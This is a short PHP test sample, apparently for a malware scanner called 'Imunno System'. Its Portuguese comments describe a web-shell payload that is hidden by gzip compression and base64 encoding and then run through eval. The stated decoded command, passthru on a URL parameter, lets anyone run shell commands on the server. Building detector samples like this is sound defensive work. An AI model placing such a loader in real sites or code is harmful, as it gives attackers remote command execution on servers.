<?php
// Amostra de teste avançada para o Imunno System
// Carga maliciosa escondida em múltiplas camadas (base64 + compressão)

// O comando 'passthru($_GET["cmd"]);' foi primeiro comprimido (gzcompress)
// e depois codificado em base64.
$carga_oculta = 'eJzT09PVVdJ3dnd2dFV0BAA7+AnV';

// O atacante usa 'eval' para executar o resultado final.
eval(gzuncompress(base64_decode($carga_oculta)));

?>